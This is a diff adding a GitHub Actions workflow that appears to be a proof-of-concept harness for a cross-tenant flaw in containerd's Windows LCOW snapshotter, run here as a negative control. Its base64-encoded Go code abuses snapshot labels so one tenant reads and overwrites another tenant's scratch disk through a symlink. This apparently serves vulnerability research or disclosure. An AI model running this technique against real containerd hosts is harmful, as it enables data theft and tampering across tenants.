@@ -1,0 +1,64 @@
+name: D17 cross-tenant NEGATIVE CONTROL
+on:
+  workflow_dispatch:
+
+jobs:
+  cross:
+    runs-on: windows-latest
+    timeout-minutes: 20
+    steps:
+      - name: Setup containerd + stub + harness source
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Stop'
+          $base='C:\ctdcross'
+          New-Item -ItemType Directory -Force -Path "$base\bin","$base\root","$base\state","$base\go","$base\stub" | Out-Null
+          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
+          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
+          $cfg='dmVyc2lvbiA9IDIKcm9vdCA9ICJDOi9jdGRwb2Mvcm9vdCIKc3RhdGUgPSAiQzovY3RkcG9jL3N0YXRlIgpbcGx1Z2lucy4naW8uY29udGFpbmVyZC5zZXJ2ZXIudjEuZ3JwYyddCiAgYWRkcmVzcyA9ICdcXC5ccGlwZVxjdGQtZ3JwYycKW3BsdWdpbnMuJ2lvLmNvbnRhaW5lcmQuc2VydmVyLnYxLnR0cnBjJ10KICBhZGRyZXNzID0gJ1xcLlxwaXBlXGN0ZC10dHJwYycKW2RlYnVnXQogIGxldmVsID0gJ2RlYnVnJwo='; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
+          $gomod='bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'; [IO.File]::WriteAllBytes("$base\go\go.mod",[Convert]::FromBase64String($gomod))
+          $src='cGFja2FnZSBtYWluCgppbXBvcnQgKAogICAgImNvbnRleHQiCiAgICAiZm10IgogICAgIm9zIgogICAgInBhdGgvZmlsZXBhdGgiCiAgICAic3RyaW5ncyIKCiAgICAiZ2l0aHViLmNvbS9jb250YWluZXJkL2NvbnRhaW5lcmQvdjIvY2xpZW50IgogICAgImdpdGh1Yi5jb20vY29udGFpbmVyZC9jb250YWluZXJkL3YyL2NvcmUvc25hcHNob3RzIgopCgpmdW5jIG1haW4oKSB7CiAgICBhZGRyIDo9IGBcXC5ccGlwZVxjdGQtZ3JwY2AKICAgIG5zIDo9ICJkMTdjcm9zcyIKICAgIGN0eCA6PSBjb250ZXh0LkJhY2tncm91bmQoKQogICAgYywgZXJyIDo9IGNsaWVudC5OZXcoYWRkciwgY2xpZW50LldpdGhEZWZhdWx0TmFtZXNwYWNlKG5zKSkKICAgIGlmIGVyciAhPSBuaWwgeyBmbXQuUHJpbnRsbigiQ0xJRU5UX0VSUjoiLCBlcnIpOyBvcy5FeGl0KDEpIH0KICAgIGRlZmVyIGMuQ2xvc2UoKQogICAgc3MgOj0gYy5TbmFwc2hvdFNlcnZpY2UoIndpbmRvd3MtbGNvdyIpCgogICAgLy8gVGVuYW50IEIgKHZpY3RpbSk6IG5vcm1hbCBQcmVwYXJlLiBTdHViIGdpdmVzIHRoZSBzY3JhdGNoIGEga25vd24gYm9keSwKICAgIC8vIHRoZW4gd2Ugb3ZlcndyaXRlIHNhbmRib3gudmhkeCB3aXRoIGEgZGlzdGluY3RpdmUgbWFya2VyIHRvIHByb3ZlIGEgcmVhZC4KICAgIHZpY3RpbUtleSA6PSAidmljdGltLXRlbmFudC1zbmFwIgogICAgdm0sIGVyciA6PSBzcy5QcmVwYXJlKGN0eCwgdmljdGltS2V5LCAiIiwgc25hcHNob3RzLldpdGhMYWJlbHMobWFwW3N0cmluZ11zdHJpbmd7ImQxNy5yb2xlIjogInZpY3RpbSJ9KSkKICAgIGlmIGVyciAhPSBuaWwgeyBmbXQuUHJpbnRsbigiVklDVElNX1BSRVBBUkVfRVJSOiIsIGVycik7IG9zLkV4aXQoMSkgfQogICAgZm10LlByaW50bG4oIlZJQ1RJTV9NT1VOVFM6Iiwgdm0pCiAgICB2aWN0aW1TYW5kYm94IDo9IGZpbGVwYXRoLkpvaW4odm1bMF0uU291cmNlLCAic2FuZGJveC52aGR4IikKICAgIG1hcmtlciA6PSAiRDE3X0NST1NTX1RFTkFOVF9WSUNUSU1fTUFSS0VSXzlGM0EyQiIKICAgIGlmIGVyciA6PSBvcy5Xcml0ZUZpbGUodmljdGltU2FuZGJveCwgW11ieXRlKG1hcmtlciksIDA2MDApOyBlcnIgIT0gbmlsIHsKICAgICAgICBmbXQuUHJpbnRsbigiTUFSS0VSX1dSSVRFX0VSUjoiLCBlcnIpOyBvcy5FeGl0KDEpCiAgICB9CiAgICBmbXQuUHJpbnRsbigiVklDVElNX1NBTkRCT1g6IiwgdmljdGltU2FuZGJveCkKCiAgICAvLyBUZW5hbnQgQSAoYXR0YWNrZXIpOiByZXVzZS1zY3JhdGNoICsgb3duZXIua2V5IGNvbnRhaW5pbmcgQidzIHNuYXBzaG90IG5hbWUuCiAgICBhdHRhY2tlcktleSA6PSAiYXR0YWNrZXItdGVuYW50LXNuYXAiCiAgICBsYWJlbHMgOj0gbWFwW3N0cmluZ11zdHJpbmd7CiAgICAgICAgImNvbnRhaW5lcmQuaW8vc25hcHNob3QvaW8ubWljcm9zb2Z0LmNvbnRhaW5lci5zdG9yYWdlLnJldXNlLXNjcmF0Y2giOiAidHJ1ZSIsCiAgICAgICAgImNvbnRhaW5lcmQuaW8vc25hcHNob3QvaW8ubWljcm9zb2Z0Lm93bmVyLmtleSI6ICAgICAgICAgICAgICAgICAgICAgICAibm8tc3VjaC1vd25lci1rZXkiLAogICAgfQogICAgYW0sIGVyciA6PSBzcy5QcmVwYXJlKGN0eCwgYXR0YWNrZXJLZXksICIiLCBzbmFwc2hvdHMuV2l0aExhYmVscyhsYWJlbHMpKQogICAgaWYgZXJyICE9IG5pbCB7IGZtdC5QcmludGxuKCJBVFRBQ0tFUl9QUkVQQVJFX0VSUjoiLCBlcnIpOyBvcy5FeGl0KDEpIH0KICAgIGZtdC5QcmludGxuKCJBVFRBQ0tFUl9NT1VOVFM6IiwgYW0pCiAgICBhdHRhY2tlclNhbmRib3ggOj0gZmlsZXBhdGguSm9pbihhbVswXS5Tb3VyY2UsICJzYW5kYm94LnZoZHgiKQogICAgZm10LlByaW50bG4oIkFUVEFDS0VSX1NBTkRCT1g6IiwgYXR0YWNrZXJTYW5kYm94KQoKICAgIC8vIEluc3BlY3QgdGhlIG1vdW50IEEgYWN0dWFsbHkgcmVjZWl2ZXMuCiAgICBmaSwgZXJyIDo9IG9zLkxzdGF0KGF0dGFja2VyU2FuZGJveCkKICAgIGZtdC5QcmludGxuKCJMU1RBVF9NT0RFOiIsIGZpLk1vZGUoKSwgImVycjoiLCBlcnIpCiAgICB0YXJnZXQsIGVyciA6PSBvcy5SZWFkbGluayhhdHRhY2tlclNhbmRib3gpCiAgICBmbXQuUHJpbnRsbigiUkVBRExJTks6IiwgdGFyZ2V0LCAiZXJyOiIsIGVycikKICAgIGRhdGEsIHJlcnIgOj0gb3MuUmVhZEZpbGUoYXR0YWNrZXJTYW5kYm94KQogICAgZm10LlByaW50bG4oIlJFQURfTEVOOiIsIGxlbihkYXRhKSwgImVycjoiLCByZXJyKQogICAgZm10LlByaW50bG4oIlJFQURfQ09OVEVOVDoiLCBzdHJpbmcoZGF0YSkpCiAgICBmbXQuUHJpbnRsbigiTUFSS0VSX0ZPVU5EOiIsIHN0cmluZ3MuQ29udGFpbnMoc3RyaW5nKGRhdGEpLCBtYXJrZXIpKQoKICAgIC8vIFByb3ZlIHdyaXRlLXRocm91Z2ggKGludGVncml0eSk6IGF0dGFja2VyIHdyaXRlcyB2aWEgdGhlIHN5bWxpbmssCiAgICAvLyB0aGVuIHJlYWQgdGhlIHZpY3RpbSdzIG93biBwYXRoIGRpcmVjdGx5IHRvIGNvbmZpcm0gdGhlIGNoYW5nZS4KICAgIHRhbXBlciA6PSAiRDE3X0FUVEFDS0VSX1RBTVBFUl83QzFFIgogICAgaWYgd2VyciA6PSBvcy5Xcml0ZUZpbGUoYXR0YWNrZXJTYW5kYm94LCBbXWJ5dGUodGFtcGVyKSwgMDYwMCk7IHdlcnIgIT0gbmlsIHsKICAgICAgICBmbXQuUHJpbnRsbigiVEFNUEVSX1dSSVRFX0VSUjoiLCB3ZXJyKQogICAgfSBlbHNlIHsKICAgICAgICB2ZGF0YSwgXyA6PSBvcy5SZWFkRmlsZSh2aWN0aW1TYW5kYm94KQogICAgICAgIGZtdC5QcmludGxuKCJWSUNUSU1fQUZURVJfVEFNUEVSOiIsIHN0cmluZyh2ZGF0YSkpCiAgICAgICAgZm10LlByaW50bG4oIlRBTVBFUl9QUk9WRU46Iiwgc3RyaW5ncy5Db250YWlucyhzdHJpbmcodmRhdGEpLCB0YW1wZXIpKQogICAgfQogICAgaWYgdGFyZ2V0ICE9ICIiICYmIHN0cmluZ3MuQ29udGFpbnMoc3RyaW5nKGRhdGEpLCBtYXJrZXIpIHsKICAgICAgICBmbXQuUHJpbnRsbigiQ1JPU1NfVEVOQU5UX1JFQURfUFJPVkVOPXRydWUiKQogICAgfSBlbHNlIHsKICAgICAgICBmbXQuUHJpbnRsbigiQ1JPU1NfVEVOQU5UX1JFQURfUFJPVkVOPWZhbHNlIikKICAgIH0KfQo='; [IO.File]::WriteAllBytes("$base\go\main.go",[Convert]::FromBase64String($src))
+          $stub='Ly9nbzpidWlsZCB3aW5kb3dzCgovLyBydW5oY3Nfc3R1Yi5nbyAtIExBQiBIQVJORVNTIGZvciB0aGUgSHlwZXItVi1kZXBlbmRlbnQgcnVuaGNzLmV4ZSBoZWxwZXIuCi8vIEltcGxlbWVudHMgdGhlIG5hcnJvdyBpbnRlcmZhY2UgY29udGFpbmVyZCdzIExDT1cgc25hcHNob3R0ZXIgdXNlczoKLy8gICBydW5oY3MuZXhlIDxnbG9iYWwgZmxhZ3M+IGNyZWF0ZS1zY3JhdGNoIC0tZGVzdHBhdGggPHBhdGg+Ci8vIEl0IGNyZWF0ZXMgYSBmaWxlIGF0IDxwYXRoPiAoYSBzdGFuZC1pbiBmb3IgdGhlIGV4dDQgVkhEWCB0aGF0IGdlbnVpbmUKLy8gcnVuaGNzIHByb2R1Y2VzIHZpYSBhIFVWTSkuIFRoaXMgaXMgTk9UIHRoZSB2dWxuZXJhYmlsaXR5IC0gdGhlIHZ1bG5lcmFibGUKLy8gY29kZSBpcyBjb250YWluZXJkJ3MgdXNlIG9mIGFuIGF0dGFja2VyLWNvbnRyb2xsZWQgbGFiZWwgYXMgYSBmaWxlc3lzdGVtCi8vIHBhdGgsIHdoaWNoIHJ1bnMgZm9yIHJlYWwgaW4gdGhpcyBQb0MuCnBhY2thZ2UgbWFpbgoKaW1wb3J0ICgKICAgICJmbXQiCiAgICAib3MiCikKCmZ1bmMgbWFpbigpIHsKICAgIGRlc3QgOj0gIiIKICAgIGZvciBpLCBhIDo9IHJhbmdlIG9zLkFyZ3MgewogICAgICAgIGlmIGEgPT0gIi0tZGVzdHBhdGgiICYmIGkrMSA8IGxlbihvcy5BcmdzKSB7CiAgICAgICAgICAgIGRlc3QgPSBvcy5BcmdzW2krMV0KICAgICAgICB9CiAgICB9CiAgICBpZiBkZXN0ID09ICIiIHsKICAgICAgICBmbXQuRnByaW50bG4ob3MuU3RkZXJyLCAicnVuaGNzIHN0dWI6IC0tZGVzdHBhdGggcmVxdWlyZWQiKQogICAgICAgIG9zLkV4aXQoMSkKICAgIH0KICAgIGYsIGVyciA6PSBvcy5PcGVuRmlsZShkZXN0LCBvcy5PX0NSRUFURXxvcy5PX1dST05MWXxvcy5PX1RSVU5DLCAwNjAwKQogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgICAgZm10LkZwcmludGxuKG9zLlN0ZGVyciwgInJ1bmhjcyBzdHViOiBvcGVuOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICAvLyBtaW5pbWFsIFZIRFgtbGlrZSBwbGFjZWhvbGRlciBjb250ZW50ICg1MTIgYnl0ZXMpCiAgICBidWYgOj0gbWFrZShbXWJ5dGUsIDUxMikKICAgIGNvcHkoYnVmLCBbXWJ5dGUoImNvbnRhaW5lZCB2aXJ0YWwgZGlzayBwbGFjZWhvbGRlciAobGFiIGhhcm5lc3MpIikpCiAgICBpZiBfLCBlcnIgOj0gZi5Xcml0ZShidWYpOyBlcnIgIT0gbmlsIHsKICAgICAgICBmLkNsb3NlKCkKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBmLkNsb3NlKCkKICAgIGZtdC5QcmludGxuKCJydW5oY3Mgc3R1YjogY3JlYXRlZCIsIGRlc3QpCn0K'; [IO.File]::WriteAllBytes("$base\stub\main.go",[Convert]::FromBase64String($stub))
+          Set-Content "$base\stub\go.mod" -Value "module stub`n`ngo 1.24" -Encoding ascii
+          Write-Output 'SETUP_OK'
+
+      - name: Build stub + harness
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Stop'
+          $base='C:\ctdcross'
+          $env:GO111MODULE='on'
+          Set-Location "$base\stub"; go build -o "$base\bin\bin\runhcs.exe" . 2>&1 | Out-Null
+          Write-Output "STUB_RC=$LASTEXITCODE"
+          Set-Location "$base\go"; go mod tidy 2>&1 | Out-Null; go build -o "$base\cross.exe" . 2>&1 | Tee-Object -FilePath "$base\build.log"
+          Write-Output "HARNESS_RC=$LASTEXITCODE"
+          Get-Item "$base\cross.exe" -ErrorAction SilentlyContinue | Select-Object FullName,Length | Format-List
+
+      - name: Start daemon + run cross-tenant PoC
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Continue'
+          $base='C:\ctdcross'
+          $p=Start-Process -FilePath "$base\bin\bin\containerd.exe" -ArgumentList @('--config',"$base\config.toml",'--log-level','debug') -RedirectStandardOutput "$base\stdout.log" -RedirectStandardError "$base\stderr.log" -PassThru
+          Write-Output "CONTAINERD_PID=$($p.Id)"
+          Start-Sleep -Seconds 8
+          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
+          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'windows-lcow'
+          Write-Output '=== RUN CROSS-TENANT HARNESS ==='
+          & "$base\cross.exe" 2>&1 | Tee-Object -FilePath "$base\cross.out"
+          Write-Output "HARNESS_EXIT=$LASTEXITCODE"
+          Start-Sleep -Seconds 3
+          Write-Output '=== daemon tail ==='
+          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 25 }
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ctd-cross-neg-evidence
+          path: |
+            C:\ctdcross\cross.out
+            C:\ctdcross\build.log
+            C:\ctdcross\stderr.log
+            C:\ctdcross\stdout.log
+          if-no-files-found: warn
